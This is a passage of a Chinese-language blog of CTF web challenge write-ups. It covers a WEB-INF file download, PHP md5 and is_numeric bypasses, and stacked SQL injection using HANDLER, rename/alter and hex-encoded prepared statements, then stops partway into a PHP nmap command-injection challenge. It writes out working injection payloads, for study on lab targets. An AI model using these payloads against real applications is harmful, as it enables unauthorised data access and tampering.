class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></div></figure><p>漏洞检测以及利用方法：</p><p> 通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>        <h2 id="解题">          <a href="#解题" class="heading-link"><i class="fas fa-link"></i></a>解题</h2>      <p>首页-&gt;help(一遍CTF题目中有help都是提示)</p><p><img src="/2021/02/08/RoarCTF-2019-Easy-Java/1.png"></p><p>有经验的遇到<code>java.io.FileNotFoundException:&#123;help.docx&#125;</code>换下请求方式，结果就可以了;</p><p>同时url栏可以看到是download，初步推测此处的利用包含漏洞找flag文件，文件泄露</p><p>GET换成POST方式访问：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Download?filename&#x3D;&#x2F;WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/RoarCTF-2019-Easy-Java/2.png"></p><p>发现FlagController</p><p>构建新的payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Download?filename&#x3D;&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/RoarCTF-2019-Easy-Java/3.png"></p><p>base64解码</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3thOTNkZmU5OC0zZWM2LTQzNzYtYWRiMS0yMjkzMjVlZjU3NzJ9Cg&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&gt;</span><br><span class="line">flag&#123;a93dfe98-3ec6-4376-adb1-229325ef5772&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ez_bypass</title>
      <link href="2021/02/08/MRCTF2020-Ez-bypass/"/>
      <url>2021/02/08/MRCTF2020-Ez-bypass/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/02/08/MRCTF2020-Ez-bypass/0.png"></p><a id="more"></a><p>网页源码：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></div></figure>        <h2 id="2-分析源码">          <a href="#2-分析源码" class="heading-link"><i class="fas fa-link"></i></a>2. 分析源码</h2>              <h3 id="1-1-第一步MD5">          <a href="#1-1-第一步MD5" class="heading-link"><i class="fas fa-link"></i></a>1.1 第一步MD5</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br></pre></td></tr></table></div></figure><p>要求get形式上传的参数gg和参数id不同，但是md5加密后要相同</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gg&#x3D;s1885207154a&amp;id&#x3D;s1836677006a</span><br><span class="line">注入语句：</span><br><span class="line">http:&#x2F;&#x2F;2a47d59a-ca83-4703-81e6-1d3b8f356cd7.node3.buuoj.cn&#x2F;?id&#x3D;s1885207154a&amp;gg&#x3D;s1836677006a</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/MRCTF2020-Ez-bypass/1.1.1.png"></p><p>“===”为强比较，只能尝试用数组，md5不能处理数组，md5(id[]=1)=NULL</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;2a47d59a-ca83-4703-81e6-1d3b8f356cd7.node3.buuoj.cn&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;2</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/MRCTF2020-Ez-bypass/1.1.2.png"></p>        <h3 id="1-2-第二步-POST上传参数-弱类型">          <a href="#1-2-第二步-POST上传参数-弱类型" class="heading-link"><i class="fas fa-link"></i></a>1.2 第二步 POST上传参数(弱类型)</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></div></figure><p>要求post上传参数passwd,需要passwd=1234567但不能为数字，其实是自相矛盾；</p><p>所以这里可以利用弱类型，即：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">所以可以利用弱类型，即让passwd&#x3D;1234567a，</span><br><span class="line">或者1234567%0a</span><br><span class="line">is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。</span><br><span class="line">is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！</span><br><span class="line">该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</span><br></pre></td></tr></table></div></figure><p>BURP抓包修改没有成功，只能用hackbar</p><p><img src="/2021/02/08/MRCTF2020-Ez-bypass/1.2.1.png"></p><p><img src="/2021/02/08/MRCTF2020-Ez-bypass/1.2.2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Blacklist</title>
      <link href="2021/02/08/GYCTF2020-Blacklist/"/>
      <url>2021/02/08/GYCTF2020-Blacklist/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/02/08/GYCTF2020-Blacklist/1.png"></p><a id="more"></a><p>四不四很熟悉，和“随便注”的题目很相似；</p><p>万能头注入一遍</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#   </span><br></pre></td></tr></table></div></figure><p>存在注入</p>        <h2 id="2-查看数据库">          <a href="#2-查看数据库" class="heading-link"><i class="fas fa-link"></i></a>2. 查看数据库</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select databases#</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/GYCTF2020-Blacklist/2.png"></p><p>回显出过滤的正则匹配</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></div></figure><p>很明显过滤了比上面一道题多了“rename”和“alter”，这意味着我们不能用上面的方法了</p>        <h2 id="3-查看数据表">          <a href="#3-查看数据表" class="heading-link"><i class="fas fa-link"></i></a>3. 查看数据表</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/GYCTF2020-Blacklist/3.png"></p><p>回显出“FlagHere”和“words”这两个数据表；</p>        <h2 id="4-使用handler语句">          <a href="#4-使用handler语句" class="heading-link"><i class="fas fa-link"></i></a>4. 使用handler语句</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;FlagHere&#96; open;handler &#96;FlagHere&#96; read first;handler &#96;FlagHere&#96; close;</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/GYCTF2020-Blacklist/4.png"></p>        <h2 id="5-HANDLER语句解释">          <a href="#5-HANDLER语句解释" class="heading-link"><i class="fas fa-link"></i></a>5. HANDLER语句解释</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler ... open      #打开一个表</span><br><span class="line">handler ... read      #访问表内容，在调用close前是不会关闭的</span><br><span class="line">handler ... close     #关闭会话</span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">Handler官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.tqwba.com/x_d/jishu/187198.html">其他参考</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯-2019-随便注</title>
      <link href="2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="0-首页">          <a href="#0-首页" class="heading-link"><i class="fas fa-link"></i></a>0. 首页</h2>      <p>判断是否存在SQL注入点</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></div></figure><a id="more"></a><p><img src="/2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png"></p><p>存在注入</p><p><img src="/2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png"></p><p>发现过滤了很多东西，没法用select 那么很多就没法查询<br>试着用堆叠注入的方法</p>        <h2 id="1-查找数据库">          <a href="#1-查找数据库" class="heading-link"><i class="fas fa-link"></i></a>1. 查找数据库</h2>        <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br></pre></td></tr></table></div></figure><p>  <img src="/2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png"></p>        <h2 id="2-查找数据表">          <a href="#2-查找数据表" class="heading-link"><i class="fas fa-link"></i></a>2. 查找数据表</h2>        <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#</span><br></pre></td></tr></table></div></figure><p>  拿到俩个数据表</p><p>  <img src="/2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png"></p>        <h2 id="3-查看数据表下的字段">          <a href="#3-查看数据表下的字段" class="heading-link"><i class="fas fa-link"></i></a>3. 查看数据表下的字段</h2>      <p>“1919810931114514”数据表下的</p>  <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc &#96;1919810931114514&#96; ;#（表外面有&#96;&#96;)(字符串为表名操作时要加反引号)</span><br></pre></td></tr></table></div></figure><p>  <img src="/2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png"></p><p>  “word”数据表下的</p>  <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc &#96;words&#96;;# 得到 id 和 data 这两列，我么可以猜测我们提交查询的窗口就是在这个表里查</span><br><span class="line">询数据的</span><br></pre></td></tr></table></div></figure><p>  <img src="/2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png"></p><ol start="4"><li>那么查询语句很有可能是 : <code>select id,data from words where id =</code><br> 但是select没法使用，同时回显不会从 那个数字表里的，只会从 words 这个表里回显，因<br> 为”1919810931114514“查询出的结果是一个数字加一个字符串；words表结构是id和data，传入<br> 的inject参数也就是赋值给了id（就是比如说最上面的arry(2)显示的一个数字，一个字符串）<br> 这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag<br> 将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是<br> 它少了一个id列，可以将flag字段改为id，或者添加id字段（下面代码中凡是表和字段的前后都有<br> ``)</li></ol><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rename 用于修改 table 的名称</span><br><span class="line">alter 用于修改表中字段的属性</span><br></pre></td></tr></table></div></figure>  <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96; ;rename table &#96;1919810931114514&#96; to &#96;words&#96; ; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</span><br></pre></td></tr></table></div></figure><p>  然后用</p>  <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 # </span><br></pre></td></tr></table></div></figure><p>  得到flag</p><p>  然后用1’ or 1=1 # 得到flag</p><p>  <img src="/2021/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png"></p>        <h2 id="4-预处理编译SQL注入">          <a href="#4-预处理编译SQL注入" class="heading-link"><i class="fas fa-link"></i></a>4. 预处理编译SQL注入</h2>      <p>绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p><p>所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。</p><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p><p>注入流程：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET;# 用于设置变量名和值</span><br><span class="line">prepare stmt_name from preparable_stmt;# 用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute stmt_name; # 执行语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;# 用来释放掉预处理的语句</span><br></pre></td></tr></table></div></figure><p>注入语句：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">set @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;</span><br><span class="line">prepare sql from @a;</span><br><span class="line">execute sql ;#</span><br><span class="line">(0x73656c656374202a2066726f6d20603139313938313039333131313435313460是select * from &#96;1919810931114514&#96;的十六进制形式)</span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/geaozhang/p/9891338.html">SQL预处理参考</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.jianshu.com/p/36f0772f5ce8">其他参考</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-2018-Online-Tool</title>
      <link href="2021/02/08/BUUCTF-2018-Online-Tool/"/>
      <url>2021/02/08/BUUCTF-2018-Online-Tool/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/02/08/BUUCTF-2018-Online-Tool/0.png"></p><a id="more"></a><p>网页源码：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="2-前言">          <a href="#2-前言" class="heading-link"><i class="fas fa-link"></i></a>2. 前言</h2>              <h3 id="2-1-SERVER-详解">          <a href="#2-1-SERVER-详解" class="heading-link"><i class="fas fa-link"></i></a>2.1 $_SERVER[]详解</h3>      <p>PHP中<code>$_SERVER</code>参数<code>HTTP_X_FORWARDED_FOR </code>&amp;<code>REMOTE_ADDR</code>与获取IP；；</p><p>在PHP 中使用 <code>$_SERVER[&quot;REMOTE_ADDR&quot;] </code>来取得客户端的 IP地址，但如果客户端是使用代理服务器来访问，那取到的就是代理服务器的 IP 地址，而不是真正的客户端 IP 地址。要想透过代理服务器取得客户端的真实 IP 地址，就要使用<code>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] </code>来读取。</p><p>不过要注意的事，并不是每个代理服务器都能用 <code>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] </code>来读取客户端的真实IP，有些用此方法读取到的仍然是代理服务器的 IP。</p><p>还有一点需要注意的是：如果客户端没有通过代理服务器来访问，那么用<code>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]</code>取到的值将是空的。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</span><br><span class="line">$_SERVER[&#39;REMOTE_ADDR&#39;]     &#x2F;&#x2F;浏览当前页面的用户的 IP 地址</span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/reserved.variables.server.php">官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/wangshuazi/p/9765012.html">参考文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="2-2-highlight-file-函数">          <a href="#2-2-highlight-file-函数" class="heading-link"><i class="fas fa-link"></i></a>2.2 highlight_file() 函数</h3>      <p>输出或返回包含在 <em>filename</em> 中的代码的语法高亮版本。</p><p><strong>例子</strong></p><p>“test.php”:</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(&quot;test.php&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></div></figure><p>输出：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"><span class="meta">&lt;?php</span>                         <span class="comment">//开始</span></span><br><span class="line">highlight_file(<span class="string">&quot;test.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span>                            <span class="comment">//结束</span></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.highlight-file.php">官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>[参考文档][<span class="exturl"><a class="exturl__link" href="https://www.w3school.com.cn/php/func_misc_highlight_file.asp]">https://www.w3school.com.cn/php/func_misc_highlight_file.asp]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="2-3-escapeshellarg函数">          <a href="#2-3-escapeshellarg函数" class="heading-link"><i class="fas fa-link"></i></a>2.3 escapeshellarg函数</h3>      <p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span 